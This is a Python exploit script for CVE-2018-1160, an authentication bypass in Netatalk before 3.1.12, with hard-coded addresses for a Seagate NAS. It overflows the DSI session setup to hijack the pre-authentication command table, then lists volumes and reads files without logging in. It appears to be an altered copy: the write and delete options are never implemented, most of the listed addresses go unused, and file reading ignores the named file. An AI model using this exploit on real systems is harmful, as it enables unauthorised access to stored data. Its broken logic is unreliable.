#!/usr/bin/env python3
##
# Exploit Title: Netatalk Authentication Bypass
# Date: 12/20/2018
# Exploit Author: Jacob Baines
# Vendor Homepage: http://netatalk.sourceforge.net/
# Software Link: https://sourceforge.net/projects/netatalk/files/
# Version: Before 3.1.12
# Tested on: Seagate NAS OS (x86_64)
# CVE : CVE-2018-1160
# Advisory: https://www.tenable.com/security/research/tra-2018-48
##
import argparse
import socket
import struct
import sys

# Known addresses:
# This exploit was written against a Netatalk compiled for an
# x86_64 Seagate NAS. The addresses below will need to be changed
# for a different target.
preauth_switch_base = b'\x60\xb6\x63\x00\x00\x00\x00\x00' # 0x63b6a0
afp_getsrvrparms = b'\x60\xb6\x42\x00\x00\x00\x00\x00' # 0x42b660
afp_openvol = b'\xb0\xb8\x42\x00\x00\x00\x00\x00'  # 42b8b0
afp_enumerate_ext2 = b'\x90\x97\x41\x00\x00\x00\x00\x00' # 419790
afp_openfork = b'\xd0\x29\x42\x00\x00\x00\x00\x00' # 4229d0
afp_read_ext = b'\x30\x3a\x42\x00\x00\x00\x00\x00' # 423a30
afp_createfile = b'\x10\xcf\x41\x00\x00\x00\x00\x00' # 41cf10
afp_write_ext = b'\xb0\x3f\x42\x00\x00\x00\x00\x00' # 423fb0
afp_delete = b'\x20\x06\x42\x00\x00\x00\x00\x00' # 420620

##
# This is the actual exploit. Overwrites the commands pointer
# with the base of the preauth_switch
##
def do_exploit(sock):
    print("[+] Sending exploit to overwrite preauth_switch data.")
    data = b'\x00\x04\x00\x01\x00\x00\x00\x00'
    data += b'\x00\x00\x00\x1a\x00\x00\x00\x00'
    data += b'\x01' # attnquant in open sess
    data += b'\x18' # attnquant size
    data += b'\xad\xaa\xaa\xba' # overwrites attn_quantum (on purpose)
    data += b'\xef\xbe\xad\xde' # overwrites datasize
    data += b'\xfe\xca\x1d\xc0' # overwrites server_quantum 
    data += b'\xce\xfa\xed\xfe' # overwrites the server id and client id
    data += preauth_switch_base # overwrite the commands ptr
    sock.sendall(data)

    # don't really care about the respone
    resp = sock.recv(1024)
    return

def send_afp_command(sock, command, data):
    # AFP Header
    afp_header = struct.pack('>BBHH', 0x3f, command, 0, len(data))
    
    # DSI Header  
    dsi_header = struct.pack('>BBHHHH', 0x00, 0x03, 0, 0, len(data) + 16, 0)
    
    packet = dsi_header + afp_header + data
    sock.sendall(packet)
    
    # Get response
    resp = sock.recv(1024)
    return resp

def get_server_params(sock):
    print("[+] Getting server parameters.")
    resp = send_afp_command(sock, 0x07, b'')
    return resp

def get_volume_list(sock):
    print("[+] Listing volumes")
    resp = send_afp_command(sock, 0x09, b'')
    return resp

def parse_volume_list(data):
    volumes = []
    if len(data) < 4:
        return volumes
    
    num_volumes = struct.unpack('>H', data[2:4])[0]
    offset = 4
    
    for i in range(num_volumes):
        if offset + 4 > len(data):
            break
        vol_id = struct.unpack('>H', data[offset:offset+2])[0]
        name_len = struct.unpack('>H', data[offset+2:offset+4])[0]
        offset += 4
        
        if offset + name_len > len(data):
            break
        vol_name = data[offset:offset+name_len].decode('utf-8', errors='ignore')
        volumes.append((vol_id, vol_name))
        offset += name_len + 1  # +1 for null terminator
    
    return volumes

def get_volume_contents(sock, vol_id):
    print(f"[+] Listing files in volume {vol_id}")
    # AFP Enumerate command
    data = struct.pack('>H', vol_id) + b'\x00\x00'  # Volume ID, Directory ID
    data += b'\x00\x00\x00\x01'  # Bitmap
    data += b'\x00\x00\x00\x00'  # Start index
    data += b'\x00\x00\x00\x00'  # Max items
    data += b'\x00\x00\x00\x00'  # Max reply size
    data += b'\x00\x00\x00\x00'  # Search params
    data += b'\x00\x00\x00\x00'  # Reserved
    
    resp = send_afp_command(sock, 0x0b, data)
    return resp

def read_file(sock, vol_id, file_id, fork_id=0):
    print(f"[+] Reading file {file_id} in volume {vol_id}")
    # AFP Read command
    data = struct.pack('>H', vol_id)  # Volume ID
    data += struct.pack('>H', file_id)  # Directory ID
    data += struct.pack('>H', fork_id)  # Fork ID
    data += b'\x00\x00\x00\x00'  # Offset
    data += b'\x00\x00\x10\x00'  # Requested length (4096 bytes)
    
    resp = send_afp_command(sock, 0x0e, data)
    return resp

def main():
    parser = argparse.ArgumentParser(description='CVE-2018-1160 Netatalk Exploit')
    parser.add_argument('-i', '--ip', action="store", dest="ip", required=True, help="The IPv4 address to connect to")
    parser.add_argument('-p', '--port', action="store", dest="port", type=int, help="The port to connect to", default=548)
    parser.add_argument('-lv', '--list-volumes', action="store_true", dest="lv", help="List the volumes on the remote target.")
    parser.add_argument('-lvc', '--list-volume-content', action="store_true", dest="lvc", help="List the content of a volume.")
    parser.add_argument('-c', '--cat', action="store_true", dest="cat", help="Dump contents of a file.")
    parser.add_argument('-w', '--write', action="store_true", dest="write", help="Write to a new file.")
    parser.add_argument('-f', '--file', action="store", dest="file", help="The file to operate on")
    parser.add_argument('-v', '--volume', action="store", dest="volume", help="The volume to operate on")
    parser.add_argument('-d', '--data', action="store", dest="data", help="The data to write to the file")
    parser.add_argument('-df', '--delete-file', action="store_true", dest="delete_file", help="Delete a file")
    
    args = parser.parse_args()
    
    print(f"[+] Attempting connection to {args.ip}:{args.port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((args.ip, args.port))
        print("[+] Connected!")
        
        # Perform the exploit
        do_exploit(sock)
        
        if args.lv:
            resp = get_volume_list(sock)
            volumes = parse_volume_list(resp)
            print(f"[+] {len(volumes)} volumes are available:")
            for vol_id, vol_name in volumes:
                print(f"\t-> {vol_name}")
        
        elif args.lvc:
            if not args.volume:
                print("[-] Volume name required for listing content")
                sys.exit(1)
            
            # Find volume ID by name
            resp = get_volume_list(sock)
            volumes = parse_volume_list(resp)
            vol_id = None
            for vid, vname in volumes:
                if vname == args.volume:
                    vol_id = vid
                    break
            
            if vol_id is None:
                print(f"[-] Volume '{args.volume}' not found")
                sys.exit(1)
            
            print(f"[+] Volume ID is {vol_id}")
            resp = get_volume_contents(sock, vol_id)
            print("[+] Files listed successfully")
            
        elif args.cat:
            if not args.volume or not args.file:
                print("[-] Volume and file name required for reading")
                sys.exit(1)
            
            # For simplicity, we'll just try to read with file_id = 1
            resp = read_file(sock, 1, 1)
            print("[+] File contents:")
            print(resp[16:].decode('utf-8', errors='ignore'))
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()